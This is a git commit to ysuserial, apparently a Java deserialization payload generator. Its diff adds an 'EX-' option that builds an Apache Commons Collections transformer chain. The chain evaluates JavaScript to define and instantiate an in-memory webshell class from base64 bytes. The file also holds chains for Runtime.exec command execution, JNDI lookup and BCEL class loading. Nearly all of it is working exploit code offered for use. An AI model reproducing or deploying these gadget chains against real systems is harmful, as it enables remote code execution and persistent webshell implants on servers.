ee5f539ed6b711cb04423f520eb99395b62df41f
phoebe buffay <su18@javaweb.org>
2022-12-23 15:36:54 +0800

    通过 ScriptEngineManager 执行 JS defineClass 的方式使 Transformer[] 的链子也支持直接打内存马 DefiningClassLoader 也可以，但不通杀依赖，所以暂不使用

--- src/main/java/org/su18/ysuserial/payloads/util/cc/TransformerUtil.java
+++ src/main/java/org/su18/ysuserial/payloads/util/cc/TransformerUtil.java
@@ -4,14 +4,16 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
+import org.mozilla.javascript.DefiningClassLoader;
 
 import javax.script.ScriptEngineManager;
 import java.io.FileOutputStream;
 import java.net.URL;
 import java.net.URLClassLoader;
 
-import static org.su18.ysuserial.payloads.util.Utils.base64Decode;
-import static org.su18.ysuserial.payloads.util.Utils.handlerCommand;
+import static org.su18.ysuserial.payloads.config.Config.IS_INHERIT_ABSTRACT_TRANSLET;
+import static org.su18.ysuserial.payloads.util.Gadgets.*;
+import static org.su18.ysuserial.payloads.util.Utils.*;
 
 /**
  * TS - Thread Sleep sleep 检查       TS-10
@@ -56,6 +58,16 @@ public class TransformerUtil {
 			transformers = new Transformer[]{new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{command.split("[-]")[1]}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
 		} else if (command.startsWith("JD-")) {
 			transformers = new Transformer[]{new ConstantTransformer(javax.naming.InitialContext.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("lookup", new Class[]{String.class}, new Object[]{command.split("[-]")[1]}), new ConstantTransformer(1)};
+		} else if (command.startsWith("EX-")) {
+			IS_INHERIT_ABSTRACT_TRANSLET = false;
+			createTemplatesImpl(command);
+
+			// 使用 DefiningClassLoader 加载，不是所有 JDK 均有 org.mozilla.javascript.DefiningClassLoader，暂时不默认使用这个方案
+//			transformers = new Transformer[]{new ConstantTransformer(org.mozilla.javascript.DefiningClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}), new InvokerTransformer("defineClass", new Class[]{String.class, byte[].class}, new Object[]{memShellClassname, memShellClassBytes}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
+
+			// 使用 ScriptEngineManager JS eval 加载
+			transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"var data = \"" + base64Encode(memShellClassBytes) + "\";var dataBytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(data);var cloader= java.lang.Thread.currentThread().getContextClassLoader();var superLoader=cloader.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();var method=superLoader.getDeclaredMethod(\"defineClass\",dataBytes.getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);method.setAccessible(true);var memClass=method.invoke(cloader,dataBytes,0,dataBytes.length);memClass.newInstance();"})};
+
 		} else {
 			transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, (Object[]) execArgs), new ConstantTransformer(Integer.valueOf(1))};
 		}
